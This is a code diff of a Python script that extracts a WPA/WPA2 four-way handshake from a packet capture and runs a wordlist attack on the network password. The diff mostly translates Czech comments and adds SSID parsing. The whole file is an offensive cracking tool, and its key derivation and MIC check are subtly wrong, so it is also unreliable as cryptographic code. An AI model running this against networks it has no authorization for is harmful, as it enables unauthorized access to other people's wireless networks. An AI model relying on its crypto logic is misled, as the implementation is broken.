@@ -1,51 +1,56 @@
 import hashlib
 import hmac
 import binascii
-import pyshark
 import argparse
 from tqdm import tqdm
-from scapy.all import rdpcap, EAPOL
+from scapy.all import rdpcap, EAPOL, Dot11
 
-# Funkce pro PBKDF2-HMAC-SHA1
+# PBKDF2-HMAC-SHA1 function
 def derive_psk(ssid, password):
     return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
 
-# Funkce pro ověření MIC
+# MIC verification function
 def verify_mic(psk, anonce, snonce, ap_mac, client_mac, eapol_frame, mic):
     pmk = psk  # Pairwise Master Key (PMK)
     key_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
     ptk = hmac.new(pmk, key_data, hashlib.sha1).digest()[:32]  # Pairwise Transient Key (PTK)
-    
     mic_calc = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()[:16]
     return mic_calc == mic
 
-# Funkce pro extrakci handshaku z .cap souboru
+# Function to extract handshake from a .cap file
 def extract_handshake(cap_file):
     cap = rdpcap(cap_file)
     ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None, None
     
     for packet in cap:
+        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:  # Beacon frame
+            ssid = packet.info.decode(errors='ignore')
+            print(f"[+] Found SSID: {ssid}")
+        
         if packet.haslayer(EAPOL):
-            if not anonce and packet.FCfield & 2:  # AP to Client
+            print(f"[+] Found EAPOL frame from {packet.addr2} to {packet.addr1}")
+            if not anonce and packet.FCfield & 2:  # AP to Client (Message 1)
                 anonce = bytes(packet.load[13:45])
-                ap_mac = bytes(packet.addr2.replace(':', ''), 'utf-8')
-            elif not snonce and packet.FCfield & 1:  # Client to AP
+                ap_mac = binascii.unhexlify(packet.addr2.replace(':', ''))
+                print(f"[+] Found ANonce: {binascii.hexlify(anonce).decode()}")
+            elif not snonce and packet.FCfield & 1:  # Client to AP (Message 2)
                 snonce = bytes(packet.load[13:45])
-                client_mac = bytes(packet.addr1.replace(':', ''), 'utf-8')
+                client_mac = binascii.unhexlify(packet.addr1.replace(':', ''))
                 mic = bytes(packet.load[-18:-2])
                 eapol_frame = bytes(packet.load[:-18]) + b'\x00' * 16  # MIC zeroed
-                
+                print(f"[+] Found SNonce: {binascii.hexlify(snonce).decode()}")
+    
     if all([ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
         return ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame
     else:
-        print("[!] Handshake nebyl nalezen!")
+        print("[!] Handshake not found!")
         exit(1)
 
-# Hlavní funkce pro útok
+# WPA cracking function
 def crack_wpa(cap_file, wordlist_file):
     ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = extract_handshake(cap_file)
     
-    print(f"[+] Útočím na síť: {ssid}")
+    print(f"[+] Targeting network: {ssid}")
     with open(wordlist_file, 'r', encoding='utf-8') as f:
         passwords = [line.strip() for line in f.readlines()]
     
@@ -60,13 +65,9 @@ def crack_wpa(cap_file, wordlist_file):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="WPA/WPA2 Password Recovery Tool")
-    parser.add_argument("cap_file", help=".cap soubor obsahující handshake")
-    parser.add_argument("-P", "--passwords", help="Wordlist ve formátu .pwds", required=True)
+    parser.add_argument("cap_file", help=".cap file containing handshake")
+    parser.add_argument("-P", "--passwords", help="Wordlist file", required=True)
     
     args = parser.parse_args()
-    
-    if not args.passwords.endswith(".pwds"):
-        print("[!] Pouze wordlisty ve formátu .pwds jsou podporovány!")
-        exit(1)
     
     crack_wpa(args.cap_file, args.passwords)
